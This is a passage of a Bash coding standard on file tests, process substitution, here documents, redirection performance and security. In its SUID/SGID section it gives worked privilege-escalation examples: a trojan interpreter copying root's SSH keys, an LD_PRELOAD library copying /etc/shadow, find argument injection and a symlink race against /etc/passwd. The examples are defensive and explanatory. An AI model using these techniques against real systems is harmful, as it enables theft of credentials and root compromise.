- **Fail fast**: Use `|| die` to exit immediately if prerequisites not met
- **Informative messages**: Include filename in error messages for debugging

**Common patterns:**

```bash
# Validate required file exists and is readable
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found ${file@Q}"
  [[ -r "$file" ]] || die 5 "Cannot read file ${file@Q}"
}

# Check if directory is writable
ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory ${dir@Q}"
  [[ -w "$dir" ]] || die 5 "Directory not writable ${dir@Q}"
}

# Only process if file was modified
process_if_modified() {
  local source=$1
  local marker=$2

  if [[ ! -f "$marker" ]] || [[ "$source" -nt "$marker" ]]; then
    process_file "$source"
    touch "$marker"
  else
    info "File ${source@Q} not modified, skipping"
  fi
}

# Check if file is executable script
is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}

# Safe file sourcing
safe_source() {
  local file=$1
  if [[ -f "$file" ]]; then
    if [[ -r "$file" ]]; then
      source "$file"
    else
      warn "Cannot read file ${file@Q}"
      return 1
    fi
  else
    debug "File not found ${file@Q} (optional)"
    return 0
  fi
}
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]]  # Breaks with spaces or special chars

# ✓ Correct - always quote
[[ -f "$file" ]]

# ✗ Wrong - using old [ ] syntax
if [ -f "$file" ]; then
  cat "$file"
fi

# ✓ Correct - use [[ ]]
if [[ -f "$file" ]]; then
  cat "$file"
fi

# ✗ Wrong - not checking before use
source "$config"  # Error if file doesn't exist

# ✓ Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
[[ -r "$config" ]] || die 5 "Cannot read config: ${config@Q}"
source "$config"

# ✗ Wrong - silent failure
[[ -d "$dir" ]] || mkdir "$dir"  # mkdir failure not caught

# ✓ Correct - check result
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: ${dir@Q}"
```

**Combining file tests:**

```bash
# Multiple conditions with AND
if [[ -f "$file" && -r "$file" && -s "$file" ]]; then
  info "Processing non-empty readable file ${file@Q}"
  process_file "$file"
fi

# Multiple conditions with OR
if [[ -f "$config1" ]]; then
  config_file=$config1
elif [[ -f "$config2" ]]; then
  config_file=$config2
else
  die 3 'No configuration file found'
fi

# Complex validation
validate_executable() {
  local script=$1

  [[ -e "$script" ]] || die 2 "File does not exist ${script@Q}"
  [[ -f "$script" ]] || die 22 "Not a regular file ${script@Q}"
  [[ -x "$script" ]] || die 126 "Not executable ${script@Q}"
  [[ -s "$script" ]] || die 22 "File is empty ${script@Q}"
}
```



---


**Rule: BCS0902**

## Wildcard Expansion
Always use explicit path when doing wildcard expansion to avoid issues with filenames starting with `-`.

```bash
# ✓ Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

# ✗ Incorrect - filenames starting with - become flags
rm -v *
```



---


**Rule: BCS0903**

## Process Substitution

**Use process substitution `<(command)` and `>(command)` to provide command output as file-like inputs or to send data to commands as if writing to files. Process substitution eliminates the need for temporary files, avoids subshell issues with pipes, and enables powerful command composition patterns.**

**Rationale:**

- **No Temporary Files**: Eliminates need for creating, managing, and cleaning up temp files
- **Avoid Subshells**: Unlike pipes to while, process substitution preserves variable scope
- **Multiple Inputs**: Commands can read from multiple process substitutions simultaneously
- **Parallelism**: Multiple process substitutions run in parallel
- **Clean Syntax**: More readable than complex piping and temp file management
- **Resource Efficiency**: Data streams through FIFOs/file descriptors without disk I/O

**How process substitution works:**

Process substitution creates a temporary FIFO (named pipe) or file descriptor that connects command output to another command's input.

```bash
# >(command) - Output redirection
# Creates: /dev/fd/63 (or similar)
# Data written to this goes to command's stdin

# <(command) - Input redirection
# Creates: /dev/fd/63 (or similar)
# Data read from this comes from command's stdout

# Example visualization:
diff <(sort file1) <(sort file2)

# Bash expands to something like:
# diff /dev/fd/63 /dev/fd/64
# Where:
#   /dev/fd/63 contains output of: sort file1
#   /dev/fd/64 contains output of: sort file2
```

**Basic patterns:**

**1. Input process substitution `<(command)`:**

```bash
# Compare command outputs
diff <(ls dir1) <(ls dir2)

# Use command output as file
cat <(echo "Header") <(cat data.txt) <(echo "Footer")

# Feed command output to another command
grep pattern <(find /data -name '*.log')

# Multiple inputs
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)
```

**2. Output process substitution `>(command)`:**

```bash
# Tee output to multiple commands
command | tee >(wc -l) >(grep ERROR) > output.txt

# Split output to different processes
generate_data | tee >(process_type1) >(process_type2) > /dev/null

# Send to command as if writing file
echo "data" > >(base64)
```

**Common use cases:**

**1. Comparing command outputs:**

```bash
# Compare sorted directory listings
diff <(ls -1 /dir1 | sort) <(ls -1 /dir2 | sort)

# Compare file checksums
diff <(sha256sum /backup/file) <(sha256sum /original/file)

# Compare configuration
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
```

**2. Reading command output into array:**

```bash
# ✓ BEST - readarray with process substitution
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)

# Array is populated correctly
echo "Users: ${#users[@]}"

# ✓ ALSO GOOD - null-delimited
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. Avoiding subshell in while loops:**

```bash
# ✓ CORRECT - Process substitution (no subshell)
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(cat file.txt)

echo "Count: $count"  # Correct value!

# Compare with pipe (wrong - creates subshell):
# cat file.txt | while read -r line; do ...
```

**4. Multiple simultaneous inputs:**

```bash
# Read from multiple sources
while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
  echo "File1: ${line1@Q}"
  echo "File2: ${line2@Q}"
done 3< <(cat file1.txt) 4< <(cat file2.txt)

# Merge sorted files
sort -m <(sort file1) <(sort file2) <(sort file3)
```

**5. Parallel processing with tee:**

```bash
# Process log file multiple ways simultaneously
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**Complete examples:**

**Example 1: Configuration comparison:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Compare configs on multiple servers
compare_configs() {
  local -a servers=("$@")
  local -- config_file=/etc/myapp/config.conf

  if [[ ${#servers[@]} -lt 2 ]]; then
    error 'Need at least 2 servers to compare'
    return 22
  fi

  info "Comparing $config_file across ${#servers[@]} servers"

  # Compare first two servers
  local -- server1="${servers[0]}"
  local -- server2="${servers[1]}"

  diff \
    <(ssh "$server1" "cat $config_file 2>/dev/null || echo 'NOT FOUND'") \
    <(ssh "$server2" "cat $config_file 2>/dev/null || echo 'NOT FOUND'")

  local -i diff_exit=$?

  if ((diff_exit == 0)); then
    success "Configs are identical on $server1 and $server2"
  else
    warn "Configs differ between $server1 and $server2"
  fi

  return "$diff_exit"
}

main() {
  compare_configs 'server1.example.com' 'server2.example.com'
}

main "$@"

#fin
```

**Example 2: Log analysis with parallel processing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Analyze log file in parallel
analyze_log() {
  local -- log_file=$1
  local -- output_dir=${2:-.}

  info "Analyzing ${log_file@Q}..."

  # Process log file multiple ways simultaneously
  cat "$log_file" | tee \
    >(grep 'ERROR' | sort -u > "$output_dir"/errors.txt) \
    >(grep 'WARN' | sort -u > "$output_dir"/warnings.txt) \
    >(awk '{print $1}' | sort -u > "$output_dir"/unique_timestamps.txt) \
    >(wc -l > "$output_dir"/line_count.txt) \
    > "$output_dir"/full_log.txt

  # Wait for all background processes
  wait

  # Report results
  local -i error_count warn_count total_lines

  error_count=$(wc -l < "$output_dir"/errors.txt)
  warn_count=$(wc -l < "$output_dir"/warnings.txt)
  total_lines=$(cat "$output_dir"/line_count.txt)

  info "Analysis complete:"
  info "  Total lines: $total_lines"
  info "  Unique errors: $error_count"
  info "  Unique warnings: $warn_count"
}

main() {
  local -- log_file=${1:-/var/log/app.log}
  analyze_log "$log_file"
}

main "$@"
#fin
```

**Example 3: Data merging with process substitution:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Merge and compare data from multiple sources
merge_user_data() {
  local -- source1=$1
  local -- source2=$2

  # Read users from multiple sources simultaneously
  local -a users1 users2

  readarray -t users1 < <(cut -d: -f1 "$source1" | sort -u)
  readarray -t users2 < <(cut -d: -f1 "$source2" | sort -u)

  info "Source 1: ${#users1[@]} users"
  info "Source 2: ${#users2[@]} users"

  # Find users in both
  local -a common
  readarray -t common < <(comm -12 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Find users only in source1
  local -a only_source1
  readarray -t only_source1 < <(comm -23 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Find users only in source2
  local -a only_source2
  readarray -t only_source2 < <(comm -13 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Report
  info "Common users: ${#common[@]}"
  info "Only in source 1: ${#only_source1[@]}"
  info "Only in source 2: ${#only_source2[@]}"
}

main() {
  merge_user_data '/etc/passwd' '/backup/passwd'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using temp files instead
temp1=$(mktemp)
temp2=$(mktemp)
sort file1 > "$temp1"
sort file2 > "$temp2"
diff "$temp1" "$temp2"
rm "$temp1" "$temp2"

# ✓ Correct - process substitution (no temp files)
diff <(sort file1) <(sort file2)

# ✗ Wrong - pipe to while (subshell issue)
declare -i count=0
cat file | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ Correct - process substitution (no subshell)
declare -i count=0
while read -r line; do
  count+=1
done < <(cat file)
echo "$count"  # Correct value!

# ✗ Wrong - sequential processing
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt
# Reads file 3 times!

# ✓ Correct - parallel with tee and process substitution
cat log | tee \
  >(grep ERROR > errors.txt) \
  >(grep WARN > warnings.txt) \
  >(wc -l > count.txt) \
  > /dev/null
# Reads file once, processes in parallel

# ✗ Wrong - not quoting process substitution
diff <(sort $file1) <(sort $file2)  # Word splitting!

# ✓ Correct - quote variables
diff <(sort "$file1") <(sort "$file2")

# ✗ Wrong - forgetting error handling
diff <(failing_command) file
# If failing_command fails, diff gets empty input

# ✓ Correct - check command success
if temp_output=$(failing_command); then
  diff <(echo "$temp_output") file
else
  die 1 'Command failed'
fi
```

**Edge cases and advanced patterns:**

**1. File descriptor assignment:**

```bash
# Assign process substitution to file descriptor
exec 3< <(long_running_command)

# Read from it later
while IFS= read -r line <&3; do
  echo "$line"
done

# Close when done
exec 3<&-
```

**2. Multiple outputs with tee:**

```bash
# Send different data to different commands
{
  echo "type1: data1"
  echo "type2: data2"
  echo "type1: data3"
} | tee \
  >(grep 'type1' > type1.log) \
  >(grep 'type2' > type2.log) \
  > all.log
```

**3. Combining with here-strings:**

```bash
# Pass variable through process
var="hello world"
result=$(tr '[:lower:]' '[:upper:]' < <(echo "$var"))
echo "$result"  # HELLO WORLD

# Or with here-string (simpler for variables)
result=$(tr '[:lower:]' '[:upper:]' <<< "$var")
```

**4. Process substitution with diff:**

```bash
# Compare sorted JSON
diff \
  <(jq -S . file1.json) \
  <(jq -S . file2.json)

# Compare command output against expected
diff \
  <(my_command --output) \
  <(echo "expected output")
```

**5. NULL-delimited with process substitution:**

```bash
# Handle filenames with spaces/newlines
while IFS= read -r -d '' file; do
  echo "Processing ${file@Q}"
done < <(find /data -type f -print0)

# With readarray
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**6. Nested process substitution:**

```bash
# Complex data processing
diff \
  <(sort <(grep pattern file1)) \
  <(sort <(grep pattern file2))

# Process chains
cat <(echo "header") <(sort <(grep -v '^#' data.txt)) <(echo "footer")
```

**Testing process substitution:**

```bash
# Test that process substitution works
test_process_substitution() {
  # Should create file-like object
  local -- test_file
  test_file=$(echo <(echo "test"))

  if [[ -e "$test_file" ]]; then
    info "Process substitution creates ${test_file@Q}"
  else
    error 'Process substitution not working'
    return 1
  fi

  # Test reading
  local -- content
  content=$(cat <(echo "hello"))

  if [[ "$content" == hello ]]; then
    info 'Process substitution read test: PASS'
  else
    error "Expected 'hello', got ${content@Q}"
    return 1
  fi
}

# Test avoiding subshell
test_subshell_avoidance() {
  local -i count=0

  while read -r line; do
    ((count+=1))
  done < <(echo -e "a\nb\nc")

  if ((count == 3)); then
    info "Subshell avoidance test: PASS (count=$count)"
  else
    error "Expected count=3, got count=$count"
    return 1
  fi
}

test_process_substitution
test_subshell_avoidance
```

**When NOT to use process substitution:**

```bash
# Simple command output - command substitution is clearer
# ✗ Overcomplicated
result=$(cat <(command))

# ✓ Simpler
result=$(command)

# Single file input - direct redirection is clearer
# ✗ Overcomplicated
grep pattern < <(cat file)

# ✓ Simpler
grep pattern < file
# Or:
grep pattern file

# Variable expansion - use here-string
# ✗ Overcomplicated
command < <(echo "$variable")

# ✓ Simpler
command <<< "$variable"
```

**Summary:**

- **Use `<(command)` for input** - treats command output as readable file
- **Use `>(command)` for output** - treats command as writable file
- **Eliminates temp files** - data streams through FIFOs/file descriptors
- **Avoids subshells** - unlike pipes, preserves variable scope
- **Enables parallelism** - multiple substitutions run simultaneously
- **Multiple inputs** - commands can read from several process substitutions
- **Works with diff, comm, paste** - any command accepting file arguments
- **Quote variables** - inside process substitution, quote like normal
- **Combine with tee** - for parallel output processing

**Key principle:** Process substitution is Bash's answer to "I need this command's output to look like a file." It's more efficient than temp files, safer than pipes (no subshell), and enables powerful data processing patterns. When you find yourself creating temp files just to pass data between commands, process substitution is almost always the better solution.


---


**Rule: BCS0904**

## 
Here Documents
Use for multi-line strings or input.

```bash
# No variable expansion (note single quotes)
cat <<'EOT'
This is a multi-line
string with no variable
expansion.
EOT

# With variable expansion
cat <<EOT
User: $USER
Home: $HOME
EOT
```


---


**Rule: BCS0905**

## Input Redirection vs Cat: Performance Optimization

## Summary

Replace `cat filename` with `< filename` redirection in performance-critical contexts to eliminate process fork overhead. This optimization provides 3-100x speedup depending on usage pattern.

## Performance Comparison

### Benchmark Results (1000 iterations)

| Test Scenario | Method | Real Time | Speedup |
|---------------|--------|-----------|---------|
| **Small file output** | | | |
| Output to /dev/null | `cat file` | 0.792s | baseline |
| | `< file` | 0.234s | **3.4x faster** |
| **Command substitution** | | | |
| Read into variable | `$(cat file)` | 0.965s | baseline |
| | `$(< file)` | 0.009s | **107x faster** |
| **Larger file (500 iterations)** | | | |
| Output to /dev/null | `cat file` | 0.398s | baseline |
| | `< file` | 0.115s | **3.5x faster** |

### Why the Difference?

**External `cat` overhead:**
1. Fork a new process
2. Exec the /usr/bin/cat binary
3. Load executable into memory
4. Set up new process environment
5. Open file, read, write to stdout
6. Wait for process to exit
7. Clean up process resources

**Bash redirection `< file`:**
1. Open file descriptor (already in shell)
2. Read and output directly
3. Close file descriptor

**Command substitution `$(< file)`:**
- Bash reads file directly into variable
- Zero external processes
- Builtin-like behavior

## When to Use `< filename`

### 1. Command Substitution (CRITICAL - 107x speedup)

```bash
# RECOMMENDED - Massively faster
content=$(< file.txt)
lines=$(< data.json)
config=$(< /etc/app.conf)

# AVOID - 100x slower
content=$(cat file.txt)
lines=$(cat data.json)
config=$(cat /etc/app.conf)
```

**Rationale:** Bash reads the file directly with zero external processes.

### 2. Single Input to Command (3-4x speedup)

```bash
# RECOMMENDED
grep "pattern" < file.txt
while read line; do ...; done < file.txt
awk '{print $1}' < data.csv
sort < unsorted.txt
jq '.field' < data.json

# AVOID - Wastes a cat process
cat file.txt | grep "pattern"
cat file.txt | while read line; do ...; done
cat data.csv | awk '{print $1}'
cat unsorted.txt | sort
cat data.json | jq '.field'
```

**Rationale:** Eliminates the `cat` process entirely. Shell opens file, command reads stdin.

### 3. Loop Optimization (Massive cumulative gains)

```bash
# RECOMMENDED
for file in *.json; do
    data=$(< "$file")
    process "$data"
done

declare -i errors=0
for logfile in /var/log/app/*.log; do
    errors=$(grep -c ERROR < "$logfile")
    if ((errors)); then
        alert=$(< "$logfile")
        send_alert "$alert"
    fi
done

# AVOID - Forks cat thousands of times
for file in *.json; do
    data=$(cat "$file")
    process "$data"
done

declare -i errors=0
for logfile in /var/log/app/*.log; do
    errors=$(cat "$logfile" | grep -c ERROR)
    if ((errors)); then
        alert=$(cat "$logfile")
        send_alert "$alert"
    fi
done
```

**Rationale:** In loops, fork overhead multiplies. 1000 iterations = 1000 avoided process creations.

### 4. Conditional File Reading

```bash
# RECOMMENDED
if grep -q 'ERROR' < /var/log/app.log; then
    alert=$(< /var/log/app.log)
    notify "$alert"
fi

# AVOID
if cat /var/log/app.log | grep -q 'ERROR'; then
    alert=$(cat /var/log/app.log)
    notify "$alert"
fi
```

## When NOT to Use `< filename`

| Scenario | Why Not | Use Instead |
|----------|---------|-------------|
| Multiple files | `< file1 file2` is invalid syntax | `cat file1 file2` |
| Need cat options | No `-n`, `-A`, `-E`, `-b`, `-s` support | `cat -n file` |
| Direct output | `< file` alone produces no output | `cat file` |
| Concatenation | Cannot combine multiple sources | `cat file1 file2 file3` |
| POSIX portability | Older shells may not optimize this | `cat file` |

### Example: Invalid Usage

```bash
# WRONG - Does nothing visible
< /tmp/test.txt
# Output: (nothing - redirection without command)

# WRONG - Invalid syntax
< file1.txt file2.txt
# Error: permission denied on file2.txt

# RIGHT - Must use cat
cat file1.txt file2.txt
```

## Technical Details

### Why `< filename` Alone Does Nothing

```bash
# This opens the file on stdin but has no command to consume it
< /tmp/test.txt
# Shell: Opens file descriptor, no command to read it, closes file descriptor

# These work because there's a command to consume stdin
cat < /tmp/test.txt    # cat reads from stdin
< /tmp/test.txt cat    # Same, different order
```

The `<` operator is a **redirection operator**, not a **command**. It only opens a file on stdin; you still need a command to consume that input.

### Why Alias Doesn't Work

```bash
# This doesn't work
alias cat='< '
cat /tmp/file.txt
# Expands to: < /tmp/file.txt
# Result: No output (no command to consume the redirected input)
```

Bash has no built-in command to output file contents. You must use an external command like `cat`, `dd`, or a loop.

### The One Exception: Command Substitution

```bash
# This is the magic case
content=$(< file.txt)
```

In command substitution context, bash itself reads the file and captures it as the substitution result. This is the only case where `< filename` works standalone (within `$()`).

## Performance Model

```
Fork overhead dominant:    Small files in loops    → 100x+ speedup
I/O with fork overhead:    Large files, single use → 3-4x speedup
Zero fork:                 Command substitution    → 100x+ speedup
```

### Why Speedup is Consistent Across File Sizes

The benchmarks show:
- Small file (1 line): 3.4x speedup
- Large file (1000 lines): 3.5x speedup

**Explanation:** Process creation overhead (fork/exec) dominates I/O time even for larger files. The time to fork, exec, and wait for cat is comparable to or greater than the actual I/O operation.

## Real-World Example

### Before Optimization

```bash
#!/bin/bash

# Process all log files
declare -i errors=0
for logfile in /var/log/app/*.log; do
    # Read entire file
    content=$(cat "$logfile")

    # Count errors
    errors=$(cat "$logfile" | grep -c ERROR)

    # Extract warnings
    warnings=$(cat "$logfile" | grep WARNING)

    # Process if errors found
    if ((errors)); then
        cat "$logfile" error.log > combined.log
    fi
done
```

**Problems:**
- 4 cat processes per iteration
- 100 log files = 400 process forks
- Massive overhead in tight loop

### After Optimization

```bash
#!/bin/bash

# Process all log files
declare -i errors=0
for logfile in /var/log/app/*.log; do
    # Read entire file - 100x faster
    content=$(< "$logfile")

    # Count errors - no cat needed
    errors=$(grep -c ERROR < "$logfile")

    # Extract warnings - no cat needed
    warnings=$(grep WARNING < "$logfile")

    # Process if errors found
    if ((errors)); then
        # Multiple files - must use cat
        cat "$logfile" error.log > combined.log
    fi
done
```

**Improvements:**
- 3 process forks eliminated per iteration
- 100 log files = 300 fewer process forks
- Only 1 cat call when actually needed (concatenation)
- 10-100x faster depending on file sizes

## Recommendation

**SHOULD:** Use `< filename` in all performance-critical code for:
- Command substitution: `var=$(< file)`
- Single file input to commands: `cmd < file`
- Loops with many file reads

**MAY:** Use `cat` when:
- Concatenating multiple files
- Need cat-specific options
- Code clarity is more important than performance
- POSIX portability to very old shells is required

**MUST:** Use `cat` when:
- Multiple file arguments needed
- Using options like `-n`, `-b`, `-E`, `-T`, `-s`, `-v`

## Impact Assessment

**Performance Gain:**
- Tight loops with command substitution: 10-100x faster
- Single command pipelines: 3-4x faster
- Large scripts with many file reads: 5-50x overall speedup

**Compatibility:**
- Works in bash 3.0+, zsh, ksh
- May not be optimized in very old shells (sh, dash)
- Test in target environment

**Code Clarity:**
- `$(< file)` is bash idiom, well understood
- `cmd < file` is clearer than `cat file | cmd`
- No negative impact on readability

## Testing

```bash
# Test command substitution speedup
echo "Test content" > /tmp/test.txt

time for i in {1..1000}; do content=$(cat /tmp/test.txt); done
# Expected: ~0.8-1.0s

time for i in {1..1000}; do content=$(< /tmp/test.txt); done
# Expected: ~0.01s (100x faster)

# Test pipeline speedup
seq 1 1000 > /tmp/numbers.txt

time for i in {1..500}; do cat /tmp/numbers.txt | wc -l > /dev/null; done
# Expected: ~0.4s

time for i in {1..500}; do wc -l < /tmp/numbers.txt > /dev/null; done
# Expected: ~0.1s (4x faster)
```

## See Also

- BCS rule on process efficiency
- BCS rule on avoiding useless use of cat (UUOC)
- Bash manual: Redirections
- ShellCheck SC2002 (useless cat)

## References

- GNU Bash manual: Redirections
- Performance analysis conducted 2025-10-17
- Test platform: Linux 6.8.0-85-generic
- Bash version: 5.2+


---


**Rule: BCS1000**

# Security Considerations

This critical section establishes security-first practices for production bash scripts, covering five essential areas. It mandates never using SUID/SGID permissions on bash scripts due to inherent security risks, requires locking down PATH or explicitly validating it to prevent command hijacking, explains IFS (Internal Field Separator) safety to avoid word-splitting vulnerabilities, strongly discourages `eval` usage due to injection risks (requiring explicit justification when unavoidable), and details input sanitization patterns for validating and cleaning user input early. These practices prevent privilege escalation, command injection, path traversal, and other common attack vectors in shell scripts.


---


**Rule: BCS1001**

## SUID/SGID

**Never use SUID (Set User ID) or SGID (Set Group ID) bits on Bash scripts. This is a critical security prohibition with no exceptions.**

```bash
# ✗ NEVER do this - catastrophically dangerous
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

# ✓ Correct - use sudo for elevated privileges
sudo /usr/local/bin/myscript.sh

# ✓ Correct - configure sudoers for specific commands
# In /etc/sudoers:
# username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

- **IFS Exploitation**: Attacker can set `IFS` to control word splitting, causing commands to execute with elevated privileges
- **PATH Manipulation**: Even if you set `PATH` in the script, the kernel uses the caller's `PATH` to find the interpreter, allowing trojan attacks
- **Library Injection**: `LD_PRELOAD` and `LD_LIBRARY_PATH` can inject malicious code before script execution
- **Shell Expansion**: Bash performs multiple expansions (brace, tilde, parameter, command substitution, glob) that can be exploited
- **Race Conditions**: TOCTOU (Time Of Check, Time Of Use) vulnerabilities in file operations
- **Interpreter Vulnerabilities**: Bugs in bash itself can be exploited when running with elevated privileges
- **No Compilation**: Unlike compiled programs, script source is readable and modifiable, increasing attack surface

**Why SUID/SGID bits are dangerous on shell scripts:**

SUID/SGID bits change the effective user/group ID to the file owner's UID/GID during execution. For compiled binaries, the kernel loads and executes machine code directly. For shell scripts, the kernel:

1. Reads the shebang (`#!/bin/bash`)
2. Executes the interpreter (`/bin/bash`) with the script as argument
3. The interpreter inherits SUID/SGID privileges
4. The interpreter then processes the script, performing expansions and executing commands

This multi-step process creates numerous attack vectors that don't exist for compiled programs.

**Specific attack examples:**

**1. IFS Exploitation:**

```bash
# Vulnerable SUID script (owned by root)
#!/bin/bash
# /usr/local/bin/vulnerable.sh (SUID root)
set -euo pipefail

# Intended: Check if service is running
service_name=$1
status=$(systemctl status "$service_name")
echo "$status"
```

**Attack:**
```bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable.sh "../../etc/shadow"

# With IFS='/', the path is split into words
# systemctl status "../../etc/shadow" might be interpreted as:
# systemctl status ".." ".." "etc" "shadow"
# Depending on systemctl's argument parsing, this could expose sensitive files
```

**2. PATH Attack (interpreter resolution):**

```bash
# SUID script: /usr/local/bin/backup.sh (owned by root)
#!/bin/bash
set -euo pipefail
PATH=/usr/bin:/bin  # Script sets secure PATH

tar -czf /backup/data.tar.gz /var/data
```

**Attack:**
```bash
# Attacker creates malicious bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOT'
#!/bin/bash
# Copy root's SSH keys
cp -r /root/.ssh /tmp/stolen_keys
# Now execute the real script
exec /bin/bash "$@"
EOT
chmod +x /tmp/evil/bash

# Attacker manipulates PATH before executing SUID script
export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh

# The kernel uses the caller's PATH to find the interpreter!
# It executes /tmp/evil/bash with SUID privileges
# Attacker's code runs as root BEFORE the script's PATH is set
```

**3. Library Injection Attack:**

```bash
# SUID script: /usr/local/bin/report.sh
#!/bin/bash
set -euo pipefail

# Generate system report
echo "System Report" > /root/report.txt
df -h >> /root/report.txt
```

**Attack:**
```bash
# Attacker creates malicious shared library
cat > /tmp/evil.c << 'EOT'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    // Runs before main() / script execution
    if (geteuid() == 0) {
        system("cp /etc/shadow /tmp/shadow_copy");
        system("chmod 644 /tmp/shadow_copy");
    }
}
EOT

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# Execute SUID script with malicious library preloaded
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh

# The malicious library runs with root privileges before the script
```

**4. Command Injection via Unquoted Variables:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/cleaner.sh (SUID root)

directory=$1
# Intended to clean old files
find "$directory" -type f -mtime +30 -delete
```

**Attack:**
```bash
# Attacker injects commands through directory name
/usr/local/bin/cleaner.sh "/tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \;"

# The injected find command becomes:
# find /tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \; -type f -mtime +30 -delete
# This bypasses the intended logic and exfiltrates /etc/shadow
```

**5. Symlink Race Condition:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/secure_write.sh (SUID root)
set -euo pipefail

output_file=$1

# Check if file is safe to write
if [[ -f "$output_file" ]]; then
  die 1 "File ${output_file@Q} already exists'
fi

# Race condition window here!
# Write sensitive data
echo "secret data" > "$output_file"
```

**Attack:**
```bash
# Terminal 1: Run script repeatedly
while true; do
  /usr/local/bin/secure_write.sh /tmp/output 2>/dev/null && break
done

# Terminal 2: Create symlink in the race window
while true; do
  rm -f /tmp/output
  ln -s /etc/passwd /tmp/output
done

# If timing is right, the script writes to /etc/passwd!
```

**Safe alternatives to SUID/SGID scripts:**

**1. Use sudo with configured permissions:**

```bash
# /etc/sudoers.d/myapp
# Allow specific user to run specific script as root
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh

# Allow group to run script with specific arguments
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Use capabilities instead of full SUID:**

```bash
# For compiled programs (not scripts), use capabilities
# Grant only specific privileges needed
setcap cap_net_bind_service=+ep /usr/local/bin/myserver

# This allows binding to ports < 1024 without full root
```

**3. Use a setuid wrapper (compiled C program):**

```c
# Wrapper validates input, then executes script as root
# /usr/local/bin/backup_wrapper.c (compiled and SUID)
int main(int argc, char *argv[]) {
    // Validate arguments
    if (argc != 2) return 1;

    // Sanitize PATH
    setenv("PATH", "/usr/bin:/bin", 1);

    // Clear dangerous environment variables
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");

    // Execute script with validated environment
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. Use PolicyKit (pkexec) for GUI applications:**

```bash
# Define policy action in /usr/share/polkit-1/actions/
# Use pkexec to execute with elevated privileges
pkexec /usr/local/bin/system-config.sh
```

**5. Use systemd service with elevated privileges:**

```
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application Service

[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh
RemainAfterExit=no

# User triggers via systemctl (requires appropriate PolicyKit policy)
systemctl start myapp.service
```

**Detection and prevention:**

**Find SUID/SGID shell scripts on your system:**
```bash
# Search for SUID/SGID scripts (should return nothing!)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script

# List all SUID files (review carefully)
find / -type f -perm -4000 -ls 2>/dev/null

# List all SGID files
find / -type f -perm -2000 -ls 2>/dev/null
```

**Prevent accidental SUID on scripts:**
```bash
# Modern Linux kernels ignore SUID on scripts, but don't rely on this
# Many Unix variants still honor SUID on scripts

# In your deployment scripts, explicitly ensure no SUID:
install -m 755 myscript.sh /usr/local/bin/
# Never use -m 4755 or chmod u+s on shell scripts
```

**Why sudo is safer:**

```bash
# ✓ Sudo provides multiple safety features:
# 1. Logging: All sudo commands are logged to /var/log/auth.log
# 2. Timeout: Credentials expire after 15 minutes
# 3. Granular control: Specific commands, arguments, users
